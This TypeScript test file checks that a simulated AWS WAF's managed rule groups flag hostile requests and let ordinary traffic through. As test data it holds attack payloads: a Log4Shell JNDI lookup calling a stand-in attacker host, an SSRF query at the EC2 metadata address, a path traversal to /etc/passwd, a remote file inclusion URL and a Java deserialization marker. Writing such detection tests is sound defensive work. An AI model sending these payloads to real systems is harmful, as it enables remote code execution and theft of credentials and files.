import {
  assertArrayEquals,
  assertArrayIncludes,
  assertArrayLength,
} from "@kensio/smartass";
import { describe, it } from "vitest";

import { SimAws } from "../../aws/sim-aws.js";
import {
  simWafBrowserRequest,
  simWafWebAclDecisions,
} from "../sim-wafv2.fixture.js";
import { simWafManagedRuleFactory } from "../web-acl/sim-waf-rule.factory.js";

const encoder = new TextEncoder();

/**
 * Run one managed rule group over requests and answer with the rules that
 * claimed each of them.
 *
 * The group counts rather than blocks, so every rule in it gets to run and the
 * labels name each rule that matched. A test about detection is asking which
 * rules claim a request, and the labels are the only place that is said.
 */
async function labelsFrom(
  group: string,
): Promise<(request: Request, body?: Uint8Array) => readonly string[]> {
  const decide = await simWafWebAclDecisions(new SimAws().wafV2(), [
    {
      ...simWafManagedRuleFactory.make(),
      OverrideAction: { Count: {} },
      Statement: {
        ManagedRuleGroupStatement: { VendorName: "AWS", Name: group },
      },
    },
  ]);

  return (request, body): readonly string[] =>
    decide(request, body).labels.map((label) => label.split(":").pop() ?? "");
}

const coreRuleSet = (): Promise<
  (request: Request, body?: Uint8Array) => readonly string[]
> => labelsFrom("AWSManagedRulesCommonRuleSet");

const knownBadInputs = (): Promise<
  (request: Request, body?: Uint8Array) => readonly string[]
> => labelsFrom("AWSManagedRulesKnownBadInputsRuleSet");

/**
 * A query string of exactly this many bytes.
 */
function queryStringOf(bytes: number): string {
  return `?q=${"a".repeat(bytes - 2)}`;
}

describe("AWS managed rule detection", () => {
  it("lets ordinary traffic through every rule", async () => {
    // Given the core rule set and the known bad inputs group.
    const core = await coreRuleSet();
    const known = await knownBadInputs();

    // When a request an application of its own would make is evaluated.
    const request = simWafBrowserRequest(
      "https://example.test/orders?page=2&sort=created_at",
      { method: "POST" },
    );
    const body = encoder.encode('{"customer":"c-1234","total":19.99}');

    // Then no rule in either group claimed it. That is the test these groups
    // are usually in a test suite for.
    assertArrayLength(core(request, body), 0);
    assertArrayLength(known(request, body), 0);
  });

  it("restricts a query string to 2,048 bytes", async () => {
    // Given the core rule set.
    const core = await coreRuleSet();

    // When a query string of exactly the limit is evaluated, and one a byte
    // over it.
    const atLimit = core(
      simWafBrowserRequest(`https://example.test/search${queryStringOf(2048)}`),
    );
    const overLimit = core(
      simWafBrowserRequest(`https://example.test/search${queryStringOf(2049)}`),
    );

    // Then the limit itself is allowed and a byte more is not. AWS documents
    // the figure, so this rule matches where the AWS rule matches.
    assertArrayLength(atLimit, 0);
    assertArrayEquals(overLimit, ["SizeRestrictions_QueryString"]);
  });

  it("restricts a cookie header to 10,240 bytes", async () => {
    // Given the core rule set.
    const core = await coreRuleSet();
    const cookie = (bytes: number): Request =>
      simWafBrowserRequest("https://example.test/", {
        headers: { cookie: `session=${"a".repeat(bytes - 8)}` },
      });

    // When a cookie header of exactly the limit is evaluated, and one a byte
    // over it.
    // Then the limit itself is allowed and a byte more is not.
    assertArrayLength(core(cookie(10_240)), 0);
    assertArrayEquals(core(cookie(10_241)), ["SizeRestrictions_Cookie_Header"]);
  });

  it("restricts a body to 8,192 bytes", async () => {
    // Given the core rule set.
    const core = await coreRuleSet();
    const upload = simWafBrowserRequest("https://example.test/upload", {
      method: "POST",
    });

    // When a body of exactly the limit is evaluated, and one a byte over it.
    // Then the limit itself is allowed and a byte more is not, whether or not
    // WAF read that far into it.
    assertArrayLength(core(upload, new Uint8Array(8192)), 0);
    assertArrayEquals(core(upload, new Uint8Array(8193)), [
      "SizeRestrictions_Body",
    ]);
  });

  it("restricts a URI path to 1,024 bytes", async () => {
    // Given the core rule set.
    const core = await coreRuleSet();
    const path = (bytes: number): Request =>
      simWafBrowserRequest(`https://example.test/${"a".repeat(bytes - 1)}`);

    // When a path of exactly the limit is evaluated, and one a byte over it.
    // Then the limit itself is allowed and a byte more is not.
    assertArrayLength(core(path(1024)), 0);
    assertArrayEquals(core(path(1025)), ["SizeRestrictions_URIPath"]);
  });

  it("claims a request that sends no user agent", async () => {
    // Given the core rule set.
    const core = await coreRuleSet();

    // When a request with no User-Agent header is evaluated.
    const missing = core(new Request("https://example.test/"));

    // Then it is claimed, which is what the rule says and what surprises a
    // test suite whose own requests send no headers.
    assertArrayEquals(missing, ["NoUserAgent_Header"]);
  });

  it("claims a scanner by its user agent", async () => {
    // Given the core rule set.
    const core = await coreRuleSet();

    // When a request from one of the scanners AWS names is evaluated.
    const scanner = core(
      new Request("https://example.test/", {
        headers: { "user-agent": "Nessus SOAP" },
      }),
    );

    // Then the bad bots rule claimed it.
    assertArrayEquals(scanner, ["UserAgent_BadBots_Header"]);
  });

  it("claims a PROPFIND request", async () => {
    // Given the known bad inputs group.
    const known = await knownBadInputs();

    // When a WebDAV method reaches an application that speaks HTTP.
    const propfind = known(
      simWafBrowserRequest("https://example.test/files", {
        method: "PROPFIND",
      }),
    );

    // Then it is claimed.
    assertArrayEquals(propfind, ["Propfind_Method"]);
  });

  it("claims a request addressed to localhost and not one served locally", async () => {
    // Given the known bad inputs group.
    const known = await knownBadInputs();

    // When a request addressed to localhost is evaluated, and one addressed to
    // a simulated endpoint, which Yulin serves under `*.sim-aws.localhost`.
    const local = known(simWafBrowserRequest("http://localhost:3000/"));
    const simulated = known(
      simWafBrowserRequest(
        "http://d123.cloudfront.net.sim-aws.localhost:8080/",
      ),
    );

    // Then the first is claimed and the second is not. The rule reads the
    // AWS-facing hostname, so the suffix every simulated endpoint is served
    // under does not make it block everything.
    assertArrayEquals(local, ["Host_Localhost_Header"]);
    assertArrayLength(simulated, 0);
  });

  it("claims a request that reaches for the instance metadata", async () => {
    // Given the core rule set.
    const core = await coreRuleSet();

    // When a query argument names the metadata address.
    const ssrf = core(
      simWafBrowserRequest(
        "https://example.test/fetch?url=http%3A%2F%2F169.254.169.254%2Flatest%2Fmeta-data%2F",
      ),
    );

    // Then the metadata rule claimed it first. The address is a URL with an
    // IPv4 host as well, so the remote file inclusion rule claims it too, and
    // a blocking group would have stopped at the first of them.
    assertArrayEquals(ssrf, [
      "EC2MetaDataSSRF_QueryArguments",
      "GenericRFI_QueryArguments",
    ]);
  });

  it("claims a JNDI lookup wherever it arrives", async () => {
    // Given the known bad inputs group.
    const known = await knownBadInputs();

    // When a Log4Shell payload arrives in a header, and in a query string.
    const header = known(
      simWafBrowserRequest("https://example.test/", {
        headers: { "x-api-version": `\${jndi:ldap://attacker.test/a}` },
      }),
    );
    const query = known(
      simWafBrowserRequest(
        "https://example.test/?v=%24%7Bjndi%3Aldap%3A%2F%2Fattacker.test%2Fa%7D",
      ),
    );

    // Then each is claimed by the rule for the component it arrived in.
    assertArrayIncludes(header, "Log4JRCE_Header");
    assertArrayIncludes(query, "Log4JRCE_QueryString");
  });

  it("claims a path traversal and a remote file inclusion", async () => {
    // Given the core rule set.
    const core = await coreRuleSet();

    // When a query argument climbs out of its directory, and a body names a
    // file on another host by address.
    const traversal = core(
      simWafBrowserRequest(
        "https://example.test/read?file=..%2F..%2Fetc%2Fpasswd",
      ),
    );
    const inclusion = core(
      simWafBrowserRequest("https://example.test/render", { method: "POST" }),
      encoder.encode("template=http://192.0.2.1/shell.txt"),
    );

    // Then each is claimed. Neither reads the caller's address, so both work
    // despite every request here coming from one client.
    assertArrayEquals(traversal, ["GenericLFI_QueryArguments"]);
    assertArrayEquals(inclusion, ["GenericRFI_Body"]);
  });

  it("claims a restricted extension and leaves an ordinary one alone", async () => {
    // Given the core rule set.
    const core = await coreRuleSet();

    // When a request asks for a configuration file, and one asks for an image
    // whose name starts the same way.
    const restricted = core(
      simWafBrowserRequest("https://example.test/app.ini"),
    );
    const image = core(simWafBrowserRequest("https://example.test/logo.png"));

    // Then the extension is what decided, rather than the letters it starts
    // with.
    assertArrayEquals(restricted, ["RestrictedExtensions_URIPath"]);
    assertArrayLength(image, 0);
  });

  it("claims a request for a directory that is not meant to be served", async () => {
    // Given the known bad inputs group.
    const known = await knownBadInputs();

    // When a request asks for the deployment descriptor of a Java application.
    const exploitable = known(
      simWafBrowserRequest("https://example.test/WEB-INF/web.xml"),
    );

    // Then it is claimed.
    assertArrayEquals(exploitable, ["ExploitablePaths_URIPath"]);
  });

  it("claims a serialized Java object in a body", async () => {
    // Given the known bad inputs group.
    const known = await knownBadInputs();

    // When a body carries the base64 a Java object stream starts with.
    const payload = known(
      simWafBrowserRequest("https://example.test/import", { method: "POST" }),
      encoder.encode("state=rO0ABXNy"),
    );

    // Then it is claimed.
    assertArrayEquals(payload, ["JavaDeserializationRCE_Body"]);
  });

  it("claims an exposed administrative page and not an application's own", async () => {
    // Given the admin protection group.
    const admin = await labelsFrom("AWSManagedRulesAdminProtectionRuleSet");

    // When a request asks for a page third-party software exposes, and one
    // asks for an administrative path of the application's own.
    const exposed = admin(
      simWafBrowserRequest("https://example.test/sqlmanager/index.php"),
    );
    const own = admin(simWafBrowserRequest("https://example.test/admin/users"));

    // Then only the first is claimed. `/admin` is nowhere in what AWS
    // published, and blocking it here would send somebody off to work around a
    // rule that does not exist.
    assertArrayEquals(exposed, ["AdminProtection_URIPath"]);
    assertArrayLength(own, 0);
  });
});
